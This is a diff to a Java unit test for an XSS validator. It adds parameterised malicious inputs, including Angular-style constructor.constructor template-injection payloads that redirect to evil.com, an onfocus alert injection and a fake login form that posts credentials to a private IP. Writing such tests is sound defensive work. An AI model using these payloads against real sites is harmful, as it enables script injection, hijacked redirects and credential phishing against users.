@@ -35,7 +35,14 @@ public class NoXssValidatorTest {
             "<p><a href=\"http://htmlbook.ru/example/knob.html\">Link!!!</a></p>1221",
             "<h3>Please log in to proceed</h3> <form action=http://192.168.149.128>Username:<br><input type=\"username\" name=\"username\"></br>Password:<br><input type=\"password\" name=\"password\"></br><br><input type=\"submit\" value=\"Log in\"></br>",
             "   <img src= \"http://site.com/\"  >  ",
-            "123 <input type=text value=a onfocus=alert(1337) AUTOFOCUS>bebe"
+            "123 <input type=text value=a onfocus=alert(1337) AUTOFOCUS>bebe",
+            "{{constructor.constructor('location.href=\"https://evil.com\"')()}}",
+            "    {{constructor.constructor('alert(1)')()}}",
+            "{{}}",
+            "{{{constructor.constructor('location.href=\"https://evil.com\"')()}}}",
+            "test {{constructor.constructor('location.href=\"https://evil.com\"')()}} test",
+            "{{#if user}}Hello, {{user.name}}{{/if}}",
+            "{{ user.name }}"
     })
     public void givenEntityWithMaliciousPropertyValue_thenReturnValidationError(String maliciousString) {
         Asset invalidAsset = new Asset();
